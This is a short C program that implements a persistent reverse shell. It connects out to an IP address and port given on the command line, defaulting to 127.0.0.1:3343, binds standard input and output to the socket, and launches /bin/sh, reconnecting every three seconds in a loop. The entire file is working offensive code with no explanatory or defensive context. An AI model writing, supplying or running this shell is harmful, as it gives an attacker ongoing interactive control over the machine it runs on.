#include <stdio.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <string.h>
 
char ip_addr[16] = "127.0.0.1";  
char port[6] = "3343";

int spwan(){
    int socket_fd;
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = inet_addr(ip_addr);
    addr.sin_port = htons(atoi(port));

    socket_fd = socket(AF_INET,SOCK_STREAM,0);
    connect(socket_fd,(struct sockaddr *)&addr,sizeof(addr));
  
    dup2(socket_fd,0); // STDIN
    dup2(socket_fd,1); // STDOUT
    dup2(socket_fd,2); // STDERR
  
    execl("/bin/sh","sh",NULL,NULL,NULL);
}

int main (int argc, char **argv)
{
    if(argc>=2 && strlen(argv[1])<16 ){
        memset(ip_addr, 0, 16);
        memcpy(ip_addr, argv[1], strlen(argv[1]));
    }

    if(argc==3 && strlen(argv[2])<6){
        memset(port, 0, 6);
        memcpy(port, argv[2], strlen(argv[2]));
    }
  
    while(1){
    	pid_t pid = fork();
    	if(pid < 0){
    		exit(0);
    	}
    	if(pid == 0){
    	    spwan();
	    exit(0);
    	}
	int _;
	wait(&_);
	sleep(3);
    }

    return 0;
}
